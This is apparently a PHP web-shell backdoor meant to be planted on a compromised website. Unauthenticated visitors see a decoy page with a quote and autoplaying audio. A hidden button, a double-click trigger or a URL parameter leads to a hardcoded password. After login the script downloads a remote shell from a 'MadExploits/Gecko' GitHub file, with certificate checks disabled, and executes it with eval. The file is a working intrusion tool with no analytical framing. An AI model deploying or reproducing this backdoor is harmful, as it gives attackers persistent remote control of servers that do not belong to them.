<?php
session_start();

define('SITE_PASSWORD', 'hinotubruk');
define('GITHUB_RAW_URL', 'https://raw.githubusercontent.com/MadExploits/Gecko/refs/heads/main/gecko-new.php');

function isAuthenticated() {
    return isset($_SESSION['gecko_auth']) && $_SESSION['gecko_auth'] === true;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if ($_POST['password'] === SITE_PASSWORD) {
        $_SESSION['gecko_auth'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "Invalid password";
    }
}

if (isset($_GET['p']) && $_GET['p'] === SITE_PASSWORD) {
    $_SESSION['gecko_auth'] = true;
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if (!isAuthenticated()):
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>  </title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: white;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            position: relative;
        }
        
        .hidden-trigger {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 30px;
            height: 30px;
            background: transparent;
            border: none;
            cursor: pointer;
            opacity: 0.03;
            transition: opacity 0.2s;
            z-index: 1000;
            border-radius: 50%;
            font-size: 16px;
            color: #000;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .hidden-trigger:hover {
            opacity: 0.2;
            background: rgba(0, 0, 0, 0.05);
        }
        
        .login-popup {
            position: fixed;
            bottom: 60px;
            right: 20px;
            background: white;
            border: 1px solid #eaeaea;
            border-radius: 12px;
            padding: 20px;
            width: 280px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            display: none;
            z-index: 1001;
        }
        
        .login-popup.show {
            display: block;
            animation: fadeIn 0.2s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .login-popup input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            margin-bottom: 12px;
            outline: none;
            font-family: inherit;
        }
        
        .login-popup input:focus {
            border-color: #999;
        }
        
        .login-popup button {
            width: 100%;
            padding: 10px;
            background: #f5f5f5;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            color: #f5f5f5;
            transition: all 0.2s;
        }
        
        .login-popup button:hover {
            background: #eaeaea;
        }
        
        .login-popup .error-msg {
            color: #e00;
            font-size: 12px;
            margin-bottom: 10px;
            text-align: center;
        }
        
        .hint {
            position: fixed;
            bottom: 15px;
            right: 60px;
            font-size: 10px;
            color: rgba(0, 0, 0, 0.1);
            user-select: none;
            pointer-events: none;
        }
        
        .quote-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 60vh;
            width: 100%;
        }
        
        .quote-wrapper div {
            font-family: 'Times New Roman', Times, serif;
            text-align: left;
        }
        
        .quote-text {
            font-size: 32px;
            line-height: 1.4;
        }
        
        @media (max-width: 1023px) {
            .quote-text {
                font-size: 28px;
            }
        }
        
        @media (max-width: 767px) {
            .quote-text {
                font-size: 20px;
                padding: 0 15px;
            }
        }
        
        @media (max-width: 320px) {
            .quote-text {
                font-size: 16px;
            }
        }
        
        .quote-text a {
            color: black;
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="quote-wrapper">
        <div class="quote-text">
            "shell ku hilang ko"<br>
            -<a>sayang banyak banyak</a>
        </div>
    </div>

     <audio id="audio-player" autoplay loop>
        <source src="https://j.top4top.io/m_3720d7cby1.mp3" type="audio/mpeg">
        Your browser does not support the audio element.
    </audio>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            var audio = document.getElementById('audio-player');
            
            var playPromise = audio.play();
            
            if (playPromise !== undefined) {
                playPromise.then(function() {
                    console.log('Audio playing');
                }).catch(function(error) {
                    console.log('Autoplay blocked:', error);
                    
                    document.body.addEventListener('click', function() {
                        audio.play();
                    }, { once: true });
                });
            }
        });
    </script>
    
    <div class="hint"><-</div>
    <button class="hidden-trigger" onclick="toggleLogin()" title=""></button>
    <div class="login-popup" id="loginPopup">
        <form method="POST" action="">
            <input type="password" name="password" id="passwordInput" placeholder="********" autocomplete="off">
            <?php if (isset($error)): ?>
                <div class="error-msg"><?= htmlspecialchars($error) ?></div>
            <?php endif; ?>
            <button type="submit">→</button>
        </form>
    </div>
    
    <script>
        let popup = document.getElementById('loginPopup');
        
        function toggleLogin() {
            popup.classList.toggle('show');
            if (popup.classList.contains('show')) {
                document.getElementById('passwordInput').focus();
            }
        }
        
        document.addEventListener('click', function(event) {
            if (!event.target.closest('.login-popup') && !event.target.closest('.hidden-trigger')) {
                popup.classList.remove('show');
            }
        });
        
        document.getElementById('passwordInput')?.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                this.form.submit();
            }
        });
        
        let clickCount = 0;
        let clickTimer;
        
        document.addEventListener('click', function() {
            clickCount++;
            
            if (clickCount === 1) {
                clickTimer = setTimeout(() => {
                    clickCount = 0;
                }, 400);
            } else if (clickCount === 2) {
                clearTimeout(clickTimer);
                clickCount = 0;
                toggleLogin();
            }
        });
    </script>
</body>
</html>
<?php
exit;
endif;

function fetchRemoteContent($url) {
    $content = null;
    
    $context = stream_context_create([
        'http' => [
            'timeout' => 15,
            'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false
        ]
    ]);
    
    if (ini_get('allow_url_fopen')) {
        $content = @file_get_contents($url, false, $context);
    }
    
    if (empty($content) && function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        ]);
        $content = curl_exec($ch);
        curl_close($ch);
    }
    
    return $content;
}

$github_raw_url = 'https://raw.githubusercontent.com/MadExploits/Gecko/refs/heads/main/gecko-new.php';
$remote_php_content = fetchRemoteContent($github_raw_url);

if (empty($remote_php_content)) {
    die("<!-- Error loading content -->");
}
eval('?>' . $remote_php_content);
?>
